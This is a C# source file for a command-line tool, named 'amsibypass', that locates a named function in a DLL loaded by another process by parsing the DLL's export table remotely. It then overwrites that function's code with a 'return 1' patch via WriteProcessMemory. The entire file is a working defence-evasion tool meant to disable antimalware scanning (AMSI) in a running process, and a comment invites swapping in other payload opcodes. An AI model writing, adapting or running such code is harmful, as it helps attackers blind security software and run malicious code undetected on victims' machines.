using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;

namespace amsibypass
{
    partial class Program
    {

        static string ReadProcessMemoryString(IntPtr prochandle, IntPtr baseaddress)
        {
            string res = "";
            int bytesread = 0;
            byte[] buf = new byte[1];
            byte[] data = new byte[50];
            for(int i = 0; i < 50; i++)
            {
                ReadProcessMemory(prochandle, baseaddress + i,
                    buf, 1, out bytesread);
                data[i] = buf[0];
               // Console.WriteLine(buf[0]);
               if (buf[0] == 0)
                {
                    res = Encoding.ASCII.GetString(data);
                    return res;
                   
                }
            }


            res = BitConverter.ToString(data);
            return res;
        }
        

        static void Main(string[] args)
        {

            // file.exe [pid] [dllname] [functionname]
            if (args.Length != 3)
            {
                Console.WriteLine("Usage: file.exe [pid] [dllname] [functionname]");
                Environment.Exit(0);
            }

            
            uint pid = UInt32.Parse( args[0]);
            string dllnamearg = args[1];
            string functionname = args[2];

          

            IntPtr snapshothandle = CreateToolhelp32Snapshot(SnapshotFlags.All, pid); ;
            // Console.WriteLine(GetLastError());

            bool dllfound = false;
            MODULEENTRY32 me = new MODULEENTRY32();
            me.dwSize = (uint) Marshal.SizeOf(typeof(MODULEENTRY32));

            bool res= Module32FirstW(snapshothandle, ref me);

            IntPtr dllremotebase = IntPtr.Zero;

            if (res == true)
            {
                Console.WriteLine(me.szModule.ToString());
                while (Module32NextW(snapshothandle,ref me))
                {
                    string dllname = me.szModule.ToString();

                    if (dllname == dllnamearg)
                    {
                        dllfound = true;
                        Console.WriteLine("[+] Found in modules: {0}",me.szExePath);
                        Console.WriteLine("[+] DLL Base address: {0}",me.modBaseAddr.ToString("x"));
                        Console.WriteLine("[+] Size of DLL Image: {0}",me.modBaseSize.ToString("X"));
                        dllremotebase = (IntPtr) me.modBaseAddr;
                    }

                }
            }


            if (dllfound == false)
            {
                Console.WriteLine("[+] DLL not found in the process");
                Environment.Exit(0);
            }



            //0x001fffff
            IntPtr prochandle = OpenProcess(0x001fffff, false, pid);
            //Console.WriteLine(dllremotebase.ToString("X")) ;


            // parsing the PE headers 
            byte[] dos = new byte[Marshal.SizeOf(typeof(IMAGE_DOS_HEADER))];
            int bytesread = 0;
            ReadProcessMemory(prochandle,
                dllremotebase, dos, dos.Length, out bytesread);

            IMAGE_DOS_HEADER dosheader = BytesToStructure<IMAGE_DOS_HEADER>(dos);

          //  Console.WriteLine(dosheader.e_magic);

            byte[] signature = new byte[4];
            ReadProcessMemory(prochandle, dllremotebase + dosheader.e_lfanew
                , signature, signature.Length, out bytesread);

           // Console.WriteLine(BitConverter.ToString(signature));


            IMAGE_NT_HEADERS64 ntheader = new IMAGE_NT_HEADERS64();

            byte[] fileheader = new byte[Marshal.SizeOf(typeof(IMAGE_FILE_HEADER))];
            ReadProcessMemory(prochandle, dllremotebase + dosheader.e_lfanew + 4,
               fileheader, fileheader.Length, out bytesread);

            ntheader.FileHeader = BytesToStructure<IMAGE_FILE_HEADER>(fileheader);

          //  Console.WriteLine(ntheader.FileHeader.NumberOfSections);

           // Console.WriteLine(bytesread);


            byte[] optionalheader = new byte[Marshal.SizeOf(typeof(IMAGE_OPTIONAL_HEADER64))];
            ReadProcessMemory(prochandle, dllremotebase + dosheader.e_lfanew + 4
                + Marshal.SizeOf(ntheader.FileHeader)
                , optionalheader, optionalheader.Length, out bytesread);
            ntheader.OptionalHeader = BytesToStructure<IMAGE_OPTIONAL_HEADER64>(optionalheader);

           // Console.WriteLine(ntheader.OptionalHeader.SizeOfImage.ToString("X"));
           // Console.WriteLine(ntheader.OptionalHeader.ExportTable.VirtualAddress.ToString("X"));
           // Console.WriteLine(ntheader.OptionalHeader.ExportTable.Size.ToString("X"));

            // parsing Exports
            byte[] export1 = new byte[Marshal.SizeOf(typeof(IMAGE_EXPORT_DIRECTORY))];

            ReadProcessMemory(prochandle,(IntPtr)( dllremotebase.ToInt64() + ntheader.OptionalHeader.ExportTable.VirtualAddress),
                export1, export1.Length, out bytesread);

            IMAGE_EXPORT_DIRECTORY exports = BytesToStructure<IMAGE_EXPORT_DIRECTORY>(export1);

           // Console.WriteLine(exports.Name.ToString("x"));

           // Console.WriteLine("Number of functions: {0}",exports.NumberOfFunctions);
           // Console.WriteLine("Number of names: {0}",exports.NumberOfNames);


            string dllname2 = ReadProcessMemoryString(prochandle, dllremotebase + (int)exports.Name);

            // Console.WriteLine(dllname2);

            bool functionfound = false;
            IntPtr entptr = dllremotebase + (int)exports.AddressOfNames;
            IntPtr eatptr = dllremotebase + (int)exports.AddressOfFunctions;
            IntPtr eotptr = dllremotebase + (int)exports.AddressOfNameOrdinals;
            //Console.WriteLine(eotptr);
            Console.WriteLine("[+] Export Address Table at: {0}",eatptr.ToString("x"));
            Console.WriteLine("[+] Export Name Table at: {0}", entptr.ToString("x"));
            Console.WriteLine("[+] Export Ordinals Table at: {0}", eotptr.ToString("x"));


            for (int i = 0; i < exports.NumberOfNames; i++)
            {
                byte[] nameaddr = new byte[4];
                ReadProcessMemory(prochandle, entptr+(i*4), nameaddr, 4, out bytesread);
                int nameoffset = BitConverter.ToInt32(nameaddr, 0);
                string funcname = ReadProcessMemoryString(prochandle, dllremotebase +nameoffset);

                byte[] eotvalue = new byte[2];
                ReadProcessMemory(prochandle, eotptr + (i * 2), eotvalue, 2, out bytesread);
                int currenteot = BitConverter.ToInt16(eotvalue, 0);


                byte[] address = new byte[4];
                ReadProcessMemory(prochandle, eatptr + (currenteot * 4), address, 4, out bytesread);


               // Console.WriteLine("Function: {0} @index {1}",funcname,currenteot);
              //  Console.WriteLine(BitConverter.ToInt32(address,0).ToString("x"));

                int funcoffset = BitConverter.ToInt32(address, 0);

               // Console.WriteLine((dllremotebase+funcoffset).ToString("X"));


                


                if (funcname.Contains( functionname))
                {
                    uint oldprotect = 0;
                    functionfound = true;
                    Console.WriteLine("[+] Function at: {0} @index {1}", funcname, currenteot);
                   // Console.WriteLine(BitConverter.ToInt32(address, 0).ToString("x"));


                    //byte[] patch = { 0x66, 0xB8, 0x01, 0x00, 0xc2, 0x18,0x00 };

                    // change the payload here, put asm opcodes
                    // mov rax,1 ret
                    byte[] patch = { 0x48, 0xC7, 0xC0, 0x01, 0x00, 0x00, 0x00, 0xC3 };

                    Console.WriteLine("[+] Overwriting at {0}", (dllremotebase + funcoffset).ToString("X"));
                    Console.WriteLine("[+] with the payload {0}",BitConverter.ToString(patch));


                    VirtualProtectEx(prochandle, dllremotebase + funcoffset,
                        5, 0x40, out oldprotect);
                    WriteProcessMemory(prochandle,
                        dllremotebase + funcoffset, patch,
                        (uint)patch.Length, out bytesread);

                    byte[] temp = new byte[10];

                    ReadProcessMemory(prochandle, dllremotebase + funcoffset,
                        temp, 10, out bytesread
                        );


                    Console.WriteLine("[+] After overwritten: {0}",BitConverter.ToString(temp));

                }
                
            }
            // 7FFA1EB62540

            if (functionfound == false)
            {
                Console.WriteLine("[+] Function not found");
             }


            CloseHandle(prochandle);

            
        }
    }
}
